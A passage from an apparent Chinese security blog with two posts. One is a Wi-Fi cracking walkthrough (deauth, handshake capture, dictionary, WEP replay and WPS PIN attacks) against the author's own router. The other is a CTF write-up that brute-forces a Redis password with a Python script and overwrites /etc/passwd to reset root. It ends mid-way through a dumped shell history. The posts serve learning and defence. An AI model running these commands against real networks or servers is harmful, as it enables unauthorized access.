title="WPA-PSK/WPA2-PSK加密（Wi-Fi Protected Access）"></a><code>WPA-PSK/WPA2-PSK</code>加密（Wi-Fi Protected Access）</h5><p>说到这里，有个疑问，为什么<code>WPA-PSK/WPA2-PSK</code>加密合在一起讲呢？其实大同小异，你可以这样认为，<code>WPA</code>是为了弥补<code>WEP</code>缺陷所研究的加密模式，<code>WPA2</code>则是<code>WPA</code>的升级版本。关于<code>WPA-PSK/WPA2-PSK</code>网上有许多不错的学习链接，不再赘述，这里放两个<a href="https://blog.csdn.net/arick2013/article/details/48375751" target="_blank" rel="noopener">学习链接1</a>、<a href="https://www.cnblogs.com/chinasun021/archive/2013/01/18/2866343.html" target="_blank" rel="noopener">学习链接2</a>。</p><p>在阅读相应的文档，你会发现，<code>WPA</code>引用了<code>IEEE802.1x</code>的身份认证标准：<a href="https://www.wikiwand.com/zh-hans/%E6%89%A9%E5%B1%95%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">EAP</a>（Extensible Authentication Protocol）。其包括<a href="https://www.wikiwand.com/en/Temporal_Key_Integrity_Protocol" target="_blank" rel="noopener">TKIP</a>（临时密钥完整性协议）和<a href="https://www.wikiwand.com/en/Message_Integrity_Check" target="_blank" rel="noopener">MIC</a>（消息完整性检查）。<code>WEP</code>使用<code>64</code>位或<code>128</code>位加密密钥，必须在无线接入点和设备上手动输入，并且不会更改。<code>TKIP</code>使用每个数据包密钥，这意味着它为每个数据包动态生成一个新的128位密钥，从而防止类似攻击<code>WEP</code>的攻击方式。而<code>MIC</code>，旨在防止攻击者更改和重新发送数据包，取代了之前<code>WEP</code>标准使用的<a href="https://www.wikiwand.com/en/Cyclic_redundancy_check" target="_blank" rel="noopener">CRC</a>（循环冗余校验）。</p><p><code>WPA2</code>较<code>WPA</code>采用了更加强大的<code>AES-CCMP</code>取代<code>WPA</code>中的<code>TKIP/MIC</code>,<code>AES-CCMP</code>(AES Counter Mode CBC-MAC Protocol) 结合了两种复杂的加密技术（计数器模式和<code>CBC-MAC</code>），从而在移动客户端和接入点之间提供强大的安全协议。之所以使用<code>AES</code>，一是<code>AES</code>加密算法安全性比<code>TKIP</code>更高，而且在使用<code>TKIP</code>算法时，路由器的吞吐量会下降，进而影响到路由器的性能。</p><p>另外不得不提，今年一月份，<code>Wi-Fi</code>联盟发布了WPA3，相比较<code>WPA2</code>，又多了一些安全性的改性，有兴趣可以深入研究一番哦。</p><h4 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h4><h5 id="测试配置"><a href="#测试配置" class="headerlink" title="测试配置"></a>测试配置</h5><p>数台品牌不同的安卓手机，数台<code>PC</code>以及默认驱动为<code>rt7601u</code>型号为<code>Ralink</code>的无线网卡，<code>TP</code>路由器。</p><h5 id="外置网卡配置"><a href="#外置网卡配置" class="headerlink" title="外置网卡配置"></a>外置网卡配置</h5><p>接下来使用<code>iwconfig -a</code>的命令可以查看所有无线网卡的信息，默认的外置网卡名为<code>wlan0</code>。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539606051094.png" alt="1539606051094"></p><p>使用<code>iwconfig</code>命令，可以查看<code>wlan0</code>网卡的详细信息。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539606171774.png" alt="1539606171774"></p><p>但是发现该<code>wlan0</code>网卡并没有处于嗅探状态<code>monitor</code>监听模式，所以接下来需要激活网卡至<code>monitor</code>监听模式。使用<code>Aircrack-ng</code>中的<code>airmon-ng</code>工具激活，执行命令：<code>airmon-ng start wlan0</code>。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539606394503.png" alt="1539606394503"></p><p>已将<code>wlan0</code>更改为<code>wlan0mon</code>，且处于<code>monitor</code>监听模式，再次执行命令<code>ifconfig</code>可以看到</p><p><img src="/2018/10/17/小白无线网络测试初探/1539606434916.png" alt="1539606434916"></p><p>再次执行命令<code>iwconfig</code>验证是否处于<code>monitor</code>监听模式。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539689803585.png" alt="1539689803585"></p><p>可以看到网卡<code>wlan0mon</code>已经处于嗅探状态<code>monitor</code>监听模式，设置嗅探成功。</p><p>当然此时再次查看<code>wireshark</code>的抓包界面，也可以看到<code>mon0</code>。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539606748048.png" alt="1539606748048"></p><p>接下来进行一些相关的测试。</p><h4 id="测试目标"><a href="#测试目标" class="headerlink" title="测试目标"></a>测试目标</h4><h5 id="测试环境一：WPA-PSK-WPA2-PSK模式"><a href="#测试环境一：WPA-PSK-WPA2-PSK模式" class="headerlink" title="测试环境一：WPA-PSK/WPA2-PSK模式"></a>测试环境一：WPA-PSK/WPA2-PSK模式</h5><p>该模式下路由配置如下，名称为<code>T35t</code></p><p><img src="/2018/10/17/小白无线网络测试初探/1539607665822.png" alt="1539607665822"></p><p>密码为<code>t35ttest</code></p><p><img src="/2018/10/17/小白无线网络测试初探/1539607498731.png" alt="1539607498731"></p><h6 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h6><p>执行命令<code># airodump-ng wlan0mon</code>查看周围无线设备，发现测试目标<code>T35t</code>（<code>T35t</code>为该路由器<code>ESSID</code>号），频道<code>11</code>以及其他信息。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539607906628.png" alt="1539607906628"></p><p>过滤语句<code>airodump-ng wlan0mon --bssid 30:FC:68:CA:13:DF -c 11</code>只查看跟该设备相关的无线信号。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539608374358.png" alt="1539608374358"></p><p>可以看到存在设备<code>mac</code>地址为<code>00:00:00:00:00:00</code>（就是那串模糊的，懂不·—·）的设备正在连接该路由器</p><p>嗯，接下来使用命令<code>airodump-ng wlan0mon --bssid 30:FC:68:CA:13:DF -c 11 -w capture_wap</code>将该信号抓取保存为前缀名为<code>capture_wap</code>的文件，执行该条命令界面运行如下：</p><p><img src="/2018/10/17/小白无线网络测试初探/1539609090135.png" alt="1539609090135"></p><p>打开新的命令行界面（注意：之前的命令行界面不要关闭），然后执行命令<code>aireplay-ng -0 1 -a 30:FC:68:CA:13:DF -c 00:00:00:00:00:00 wlan0mon</code></p><p><img src="/2018/10/17/小白无线网络测试初探/1539609764786.png" alt="1539609764786"></p><p>执行成功后，正常情况下，稍等几秒，原先界面右上角即会出现<code>WPA handshake: 30:FC:68:CA:13:DF</code>，意味着成功抓到握手包，接下来只需字典爆破握手包即可。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539609304195.png" alt="1539609304195"></p><p>执行命令<code>aircrack-ng capture_wap-01.cap</code>，查看捕获握手包数据信息。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539609717980.png" alt="1539609717980"></p><p>执行命令<code>aircrack-ng capture_wap-01.cap -w dictiontry.txt</code>，爆破字典为<code>dictiontry.txt</code>文件。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539610127880.png" alt="1539610127880"></p><p>成功找到密码<code>t35ttest</code>。</p><h6 id="测试坑点一："><a href="#测试坑点一：" class="headerlink" title="测试坑点一："></a>测试坑点一：</h6><p>执行命令<code>airodump-ng wlan0mon</code>查看周围无线设备时，如果发现界面右上角存在 <code>fixed channel mon0: -1</code>字样，那么，建议换成<code>kali</code>虚拟机重新测试吧，原因是因为操作系统内核不兼容。之前尝试<code>ubuntu16.04</code>抓握手包，半天抓不到，网上去找原因，才知道是这里出了问题。</p><h6 id="测试坑点二："><a href="#测试坑点二：" class="headerlink" title="测试坑点二："></a>测试坑点二：</h6><p>在进行<code>aireplay-ng -0 1 -a 30:FC:68:CA:13:DF -c 00:00:00:00:00:00 wlan0mon</code>这条命令时，发现了一些问题。首先，该命令是执行<code>Deauth</code>攻击加速破解过程的命令，原理是通过发送<code>Deauth</code>的数据包，将已连接至无线路由器的合法客户端强制断开，此时，客户端就会重新自动重新连接无线路由器，也就是在这个过程中，有机会获得<code>WPA-PSK</code>握手验证的完整数据包。而这条命令中<code>-0</code>参数表示采用<code>Deauth</code>攻击模式，后面紧跟着攻击次数<code>1</code>次，<code>-a</code>参数后跟AP的MAC地址，<code>-c</code>参数后跟客户端的<code>MAC</code>地址，此命令也就表示为，采用<code>Deauth</code>攻击模式，将MAC地址为<code>00:00:00:00:00:00</code>客户端与MAC地址为<code>30:FC:68:CA:13:DF</code>AP之间的通信强制断开<code>1</code>次。其次，在经过几次测试中发现，除各型号安卓机型外，苹果手机在收到<code>Deauth</code>攻击后，重新连接<code>AP</code>的时段中，抓不到相应的握手包，而其他设备，均可抓到握手包。这里排除其他原因，单纯地看,苹果手机好像略高一畴。<code>^……^</code>！</p><h5 id="测试环境二：WEP模式"><a href="#测试环境二：WEP模式" class="headerlink" title="测试环境二：WEP模式"></a>测试环境二：WEP模式</h5><p>配置的<code>AP</code>如下，设置<code>WEP</code>模式下的秘钥为<code>12345</code></p><p><img src="/2018/10/17/小白无线网络测试初探/1539700073811.png" alt="1539700073811"></p><h6 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h6><p>同样执行<code>airodump-ng wlan0mon</code>探测周围的设备</p><p><img src="/2018/10/17/小白无线网络测试初探/1539700191232.png" alt="1539700191232"></p><p>由上图可知当前目标AP的工作频道为<code>11</code>，相应地，过滤出当前<code>AP</code>可以清晰看到与当前<code>AP</code>进行连接的其他设备。</p><p>执行命令<code>airodump-ng wlan0mon --bssid 30:FC:68:CA:13:DF -c 11</code></p><p><img src="/2018/10/17/小白无线网络测试初探/1539700462910.png" alt="1539700462910"></p><p>上图可以查看详细的交互设备MAC，模糊处的MAC地址为<code>00:00:00:00:00:00</code>。</p><p>接下来抓取<code>IVS</code>数据报文，执行命令<code>airodump-ng --ivs -w capture_wep -c 11 wlan0mon --bssid 30:FC:68:CA:13:DF</code>，该条命令表示只抓取<code>bssid</code>为<code>30:FC:68:CA:13:DF</code>的<code>IVS</code>数据报文，并将其保存至前缀名为<code>capture_wep</code>的文件中。</p><p>执行完上条命令后，新开一个命令行界面，执行命令<code>aireplay-ng -3 -b 30:FC:68:CA:13:DF -h 00:00:00:00:00:00 wlan0mon</code>，该命令参数<code>-3</code> 表示采用<code>ArpRequest</code>注入攻击模式，<code>-b</code>后紧跟<code>AP</code>的<code>MAC</code>地址，<code>-h</code>后紧跟客户端<code>MAC</code>地址。<code>ArpRequest</code>注入攻击原理是通过读取交互设备之间的ARP请求报文，并伪造报文再次重发出去，从而刺激<code>AP</code>产生更多的数据包，以供抓取更多的<code>IVS</code>数据包，加快破解速度。在执行该条命令后，查看之前的界面可以发现<code>Data</code>列的数据一直在增加。</p><p>然后再新开一个界面，执行命令<code>aircrack-ng capture_wep-01.ivs</code>，<code>Aircrack-ng</code>就会自动进行破解。</p><p><img src="/2018/10/17/小白无线网络测试初探/1539748612030.png" alt="1539748612030"></p><p>成功破解密码<code>12345</code>，耗时大概两分多钟。什么，密码设置的太简单了，那接下来设置个比较难的呗：<code>#fl?\2a&amp;*6^g{</code></p><p><img src="/2018/10/17/小白无线网络测试初探/1539701713227.png" alt="1539701713227"></p><p>按照上面的命令，依旧破解下来，也只是多花了几分钟的时间，这还是除去虚拟机的配置，<code>hhh~</code></p><p><img src="/2018/10/17/小白无线网络测试初探/1539748464553.png" alt="1539748464553"></p><p>所以如果还是<code>WEP</code>的，赶紧换<code>WPA2</code>吧，亡羊补牢，哪怕还没亡羊。</p><h5 id="测试环境三：WPS模式"><a href="#测试环境三：WPS模式" class="headerlink" title="测试环境三：WPS模式"></a>测试环境三：WPS模式</h5><p>无线路由器PIN码设置为<code>54808782</code></p><p><img src="/2018/10/17/小白无线网络测试初探/1539784367010.png" alt="1539784367010"></p><h6 id="实验步骤-2"><a href="#实验步骤-2" class="headerlink" title="实验步骤"></a>实验步骤</h6><p>该模式下，可以使用<code>Reaver</code>工具强制爆破<code>PIN</code>码，通过<code>PIN</code>码得到<code>wifi</code>密码。</p><p>同样先使用<code>airmon-ng start wlan0</code>进行网卡嗅探</p><p><img src="/2018/10/17/小白无线网络测试初探/1539784299745.png" alt="1539784299745"></p><p>查看到目标<code>AP</code>的<code>SSID</code>即可开始测试，这里依旧与之前的MAC地址相同：<code>30:FC:68:CA:13:DF</code></p><p>执行命令<code>reaver -i wlan0mon -b 30:FC:68:CA:13:DF -p 54808782</code>，稍等一会，即会出现以下界面</p><p><img src="/2018/10/17/小白无线网络测试初探/1539784690422.png" alt="1539784690422"></p><p>可以看到已经破解成功。当然，这是在已知<code>PIN</code>码情况下，进行的测试。在不知<code>PIN</code>码的情况下只能爆破，基本上是个几天几夜，对应的命令为<code>reaver -i wlan0mon -b 30:FC:68:CA:13:DF -vv</code>。</p><p>虽然许多路由器默认关闭<code>WPS</code>，但还是建议大家认真检查下，如果开了<code>QQS</code>，顺手把它关了吧。反正也就是举手之劳，省掉一个安全隐患，何乐不为？</p><h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p>以上的种种测试，均是自行配置设备，再自行测试，学术不精，见谅。实践出真知，了解攻击原理，有助于更好部署防御措施。“害群之马者坏人也，非兵也”，自行斟酌，三思后行。</p><p><strong>ps:</strong></p><p><code>本文由安全客原创发布</code>  </p><p><code>转载，请参考</code><a href="https://www.anquanke.com/note/repost" target="_blank" rel="noopener">转载声明</a><code>，注明出处：</code> <a href="https://www.anquanke.com/post/id/162209" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162209</a>  </p><p><code>安全客 - 有思想的安全新媒体</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;随着技术的发展，无线网络&lt;code&gt;wifi&lt;/code&gt;遍布每个角落，殊不知隐藏其中的风云涌动。&lt;/p&gt;
    
    </summary>
    
    
      <category term="wifi" scheme="https://jianghuxia.github.io/tags/wifi/"/>
    
  </entry>
  
  <entry>
    <title>首届信安之路巅峰挑战赛writeup详解</title>
    <link href="https://jianghuxia.github.io/2018/09/27/%E9%A6%96%E5%B1%8A%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%B7%85%E5%B3%B0%E6%8C%91%E6%88%98%E8%B5%9Bwriteup%E8%AF%A6%E8%A7%A3/"/>
    <id>https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/</id>
    <published>2018-09-26T17:30:07.000Z</published>
    <updated>2018-09-26T17:32:36.604Z</updated>
    
    <content type="html"><![CDATA[<p>拿了首届信安之路巅峰挑战赛第一，这次比赛的<code>writeup</code>如下，<code>orz</code>，<code>orz</code>。<br><a id="more"></a></p><h4 id="Level-1"><a href="#Level-1" class="headerlink" title="Level_1"></a>Level_1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">欢迎参加首届信安之路巅峰挑战赛，第一关的入口：</span><br><span class="line"></span><br><span class="line">http://wifiseciloveyouxazl.xazlsec.com</span><br><span class="line"></span><br><span class="line">获得 key 之后，通过后台发送 key 将获得第二关的入口信息，祝你好运！</span><br></pre></td></tr></table></figure><p>选择题为主，最后一题例外，为此，还抓了个包，研究了下<code>js</code>脚本</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537671101647.png" alt="1537671101647"></p><p>看下脚本</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537671166487.png" alt="1537671166487"></p><p>火狐抓个包，得到<code>key</code>?这<code>tm</code>什么原理。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537671058562.png" alt="1537671058562"></p><h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level_2"></a>Level_2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">恭喜通关第一关，第二关入口：</span><br><span class="line"></span><br><span class="line">http://nizhidaoqianduanyoushama.xazlsec.com</span><br><span class="line"></span><br><span class="line">获得 key 之后，通过后台发送 key 将获得第三关的入口信息，祝你好运！</span><br></pre></td></tr></table></figure><p>我滴个天啊。。。。。弱密码随意登陆。。。。。不好意思，这题我真是非预期解法，具体的预期解法，之前信安之路文章已发，就不仔细讲述啦！</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537674858782.png" alt="1537674858782"></p><p>得到第二关答案<code>key:2c4b23c265c3e834f31024533565f2be</code></p><h4 id="Level-3"><a href="#Level-3" class="headerlink" title="Level_3"></a>Level_3</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">恭喜完成第二关，第三关的入口：</span><br><span class="line"></span><br><span class="line">http://honglanduikburongyiya.xazlsec.com</span><br><span class="line"></span><br><span class="line">获得 key 之后，通过后台发送 key 将获得第四关的入口信息，祝你好运！</span><br></pre></td></tr></table></figure><p>这题，学到的东西很多，坑点多，但就是好玩。</p><p>日常扫端口</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537705229073.png" alt="1537705229073"></p><p>没发现啥（这时候也没全<code>tcp</code>端口扫描），后面出题老哥放出新提示</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537710317853.png" alt="1537710317853"></p><p>上网搜搜，嗯 ,<code>6379 Redis</code>很有可能哦。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537710120269.png" alt="1537710120269"></p><p>尝试一波，发现<code>6379</code>端口开的是<code>redis</code>服务，执行命令<code>redis-cli -h 66.42.84.155 -p 6379</code>，发现可以登录，但是需要密码。</p><p>尝试使用<code>hydra</code>爆破，但是不知为啥，爆破无效（这里上网搜索了下，说是<code>hydra</code>编译问题），于是尝试使用<code>python</code>脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">import redis</span><br><span class="line">import sys</span><br><span class="line">import getopt</span><br><span class="line">import datetime</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">author:Qing</span><br><span class="line">try to login the redis database</span><br><span class="line">-h help</span><br><span class="line">-P password file</span><br><span class="line">-a server address</span><br><span class="line">-o port, default 6379</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def usage():</span><br><span class="line">    print &apos;&apos;&apos;Options:</span><br><span class="line">-h help</span><br><span class="line">-P password file</span><br><span class="line">-a server address</span><br><span class="line">-o port, default 6379</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">port = 6379  # default port</span><br><span class="line">starttime = time.localtime()</span><br><span class="line">print &quot;start time: &quot;, time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, starttime)</span><br><span class="line">opts, args = getopt.getopt(sys.argv[1:], &quot;hP:a:o:&quot;)</span><br><span class="line">for op, value in opts:</span><br><span class="line">    if op == &quot;-P&quot;:</span><br><span class="line">        input_file = value</span><br><span class="line">    elif op == &quot;-a&quot;:</span><br><span class="line">        host = value</span><br><span class="line">    elif op == &quot;-o&quot;:</span><br><span class="line">        port = value</span><br><span class="line">    elif op == &quot;-h&quot;:</span><br><span class="line">        usage()</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">fo = open(&quot;hydra_zidian.txt&quot;, &quot;r+&quot;)</span><br><span class="line">passwd = &quot; &quot;</span><br><span class="line">while 1:</span><br><span class="line">    host = &apos;66.42.84.155&apos;</span><br><span class="line">    port=6379</span><br><span class="line">    line = fo.readline()</span><br><span class="line">    passwd = line</span><br><span class="line">    passwd = passwd[0:(len(passwd) - 1)]  # filter the /n</span><br><span class="line">    print passwd</span><br><span class="line">    rs = redis.Redis(host, port, db=0, password=passwd)  # AUTH password</span><br><span class="line">    response = &apos;wrong passwd&apos;</span><br><span class="line">    try:</span><br><span class="line">        response = rs.ping()  # use PING to judge the state of redis</span><br><span class="line">    except redis.exceptions.ResponseError:</span><br><span class="line">        pass</span><br><span class="line">    # print response</span><br><span class="line">    else:</span><br><span class="line">        if response == True:</span><br><span class="line">            print response</span><br><span class="line">            print passwd</span><br><span class="line">            fo.close()</span><br><span class="line">            stoptime = time.localtime()</span><br><span class="line">            print &quot;stop time: &quot;, time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, stoptime)</span><br><span class="line">            exit(0)</span><br><span class="line">    if not line:</span><br><span class="line">        print &quot;no valid passwd&quot;</span><br><span class="line">        stoptime = time.localtime()</span><br><span class="line">        print &quot;stop time: &quot;, time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, stoptime)</span><br><span class="line">        exit(0)</span><br></pre></td></tr></table></figure><p>字典选择<code>top100</code>弱密码就行啦，开始爆破。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537683344278.png" alt="1537683344278"></p><p>爆破成功，密码是：<code>1q2w3e4r</code></p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537683400926.png" alt="1537683400926"></p><p>嗯~，爆破是成功了，但是怎么利用<code>redis</code>漏洞呢，可以看看这篇<a href="http://www.freebuf.com/vuls/148758.html" target="_blank" rel="noopener">文章</a>，其中详细指出了一些想法。</p><p>自己测试时，发现<code>/root/.ssh/</code>这个目录不在了，想着利用<code>redis</code>写入自己私钥，远程<code>ssh</code>连接上去的幻想也就破灭了。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537705728399.png" alt="1537705728399"></p><p>后面尝试着，网上学习了一波，尝试着读下<code>/etc/</code>这个目录，喔！竟然存在，嘿嘿，那么是不是可以尝试<code>/etc/passwd</code> 文件实现任意账号密码的重置呢？具体操作请查看上述那个链接，下面是自己的操作：</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537705840894.png" alt="1537705840894"></p><p>好的，成功<code>save</code>后，尝试以<code>root</code>用户登陆，然后就这样登上去了，<code>root</code>用户登上去了?^–$–*/，还是有点吃惊的，赶快联系了下出题的大佬，问下就这样？这是预期解法？直接用<code>root</code>?后面问了下，<code>redis</code>是用<code>root</code> 身份启动，被菜鸡我刚好撞上了，直接把<code>root</code>密码重置了。甚至，不小心把<code>/etc/shadow</code>给搞坏了，抱歉啊，不是故意的。</p><p>查看下敏感信息</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537694656137.png" alt="1537694656137"></p><p>后面老哥给了我个<code>admin</code>的用户账号和密码，心虚的我也不好意思的接受了。咳，继续解题。回到<code>root</code>用户登陆后，用<code>root</code>权限转了一圈，看了下<code>/tmp/history</code>，以下为内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">[root@vultr tmp]<span class="comment"># cat history </span></span><br><span class="line">    1  yum update</span><br><span class="line">    2  yum list | grep rredis</span><br><span class="line">    3  yum list | grep redis</span><br><span class="line">    4  yum install redis</span><br><span class="line">    5  redis-cli</span><br><span class="line">    6  iptables</span><br><span class="line">    7  iptables -L</span><br><span class="line">    8  iptables -L -F</span><br><span class="line">    9  iptables  -F</span><br><span class="line">   10  redis-cli</span><br><span class="line">   11  yum install redis-server</span><br><span class="line">   12  wget http://download.redis.io/releases/redis-3.2.12.tar.gz</span><br><span class="line">   13  tar xzfv redis-3.2.12.tar.gz </span><br><span class="line">   14  <span class="built_in">cd</span> redis-3.2.12</span><br><span class="line">   15  ls</span><br><span class="line">   16  make</span><br><span class="line">   17  ls</span><br><span class="line">   18  <span class="built_in">cd</span> ../</span><br><span class="line">   19  rm -rf *</span><br><span class="line">   20  wget wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br><span class="line">   21  tar xzfv redis-2.8.17.tar.gz </span><br><span class="line">   22  yum install gcc</span><br><span class="line">   23  yum install cc</span><br><span class="line">   24  yum install g++</span><br><span class="line">   25  <span class="built_in">cd</span> redis-2.8.17</span><br><span class="line">   26  make</span><br><span class="line">   27  make install</span><br><span class="line">   28  <span class="built_in">cd</span> ../</span><br><span class="line">   29  redis -cli</span><br><span class="line">   30  redis-cli</span><br><span class="line">   31  <span class="built_in">cd</span> redis-2.8.17/s</span><br><span class="line">   32  <span class="built_in">cd</span> redis-2.8.17/</span><br><span class="line">   33  ls</span><br><span class="line">   34  <span class="built_in">cd</span> src/</span><br><span class="line">   35  l</span><br><span class="line">   36  ls</span><br><span class="line">   37  <span class="built_in">cd</span> ../</span><br><span class="line">   38  vim redis.conf </span><br><span class="line">   39  yum install vim</span><br><span class="line">   40  ls</span><br><span class="line">   41  vim redis.conf </span><br><span class="line">   42  <span class="built_in">cd</span> src/</span><br><span class="line">   43  ./redis-server </span><br><span class="line">   44  ./redis-server &amp;</span><br><span class="line">   45  ps -ef</span><br><span class="line">   46  ifconfig</span><br><span class="line">   47  <span 